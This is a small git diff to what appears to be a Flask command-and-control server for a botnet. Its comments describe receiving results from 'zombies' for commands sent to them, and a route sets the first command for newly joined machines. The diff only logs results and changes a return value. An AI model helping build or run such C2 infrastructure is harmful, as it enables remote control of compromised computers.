@@ -3,7 +3,7 @@ from database_helper import OpenDatabase
 
 app = Flask(__name__)
 
-# some constants
+# some constantsS
 newcomer_command = "dir" # a dir command for windows cmd
 database_name = 'test_database.db'
 
@@ -38,9 +38,10 @@ def recordExecutionResult(zid, command, result):
     print('server - record_response')
     """this is how i receive responses (from zombies) to previously sent commands."""
     global database_name
+    print(result)
     with OpenDatabase(database_name) as helper:
         res = helper.writeResult(zid, command, result)
-    return result
+    return "recorded"
 
 
 @app.route("/setNewcomerCommand/<the_command>")
